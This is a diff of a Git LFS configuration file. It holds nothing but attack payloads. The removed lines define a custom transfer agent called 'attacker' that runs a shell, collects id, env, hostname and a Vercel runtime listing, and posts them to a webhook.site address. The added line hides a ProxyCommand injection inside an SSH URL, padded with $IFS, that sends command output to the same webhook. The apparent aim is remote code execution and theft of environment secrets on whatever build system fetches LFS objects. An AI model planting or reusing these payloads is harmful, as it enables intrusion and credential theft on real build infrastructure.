@@ -1,9 +1,2 @@
 [lfs]
-	url = https://webhook.site/1081ee27-e35f-458d-bb16-031fc59a0a14
-	standalonetransferagent = attacker
-
-[lfs "customtransfer.attacker"]
-	path = /bin/sh
-	args = -c "id > /tmp/kc-lfs-rce.txt 2>&1; env >> /tmp/kc-lfs-rce.txt 2>&1; hostname >> /tmp/kc-lfs-rce.txt 2>&1; ls /run/vercel 2>&1 >> /tmp/kc-lfs-rce.txt; curl -sS -X POST https://webhook.site/1081ee27-e35f-458d-bb16-031fc59a0a14/kc-lfs-rce-marker --data-binary @/tmp/kc-lfs-rce.txt"
-	concurrent = false
-	direction = download
+	url = ssh://-oProxyCommand=/bin/sh$IFS-c$IFS'curl$IFS-sS$IFS-XPOST$IFS-dpwn:$(id;hostname)$IFShttps://webhook.site/1081ee27-e35f-458d-bb16-031fc59a0a14/kc-ssh-rce'@github.com/attacker/x.git
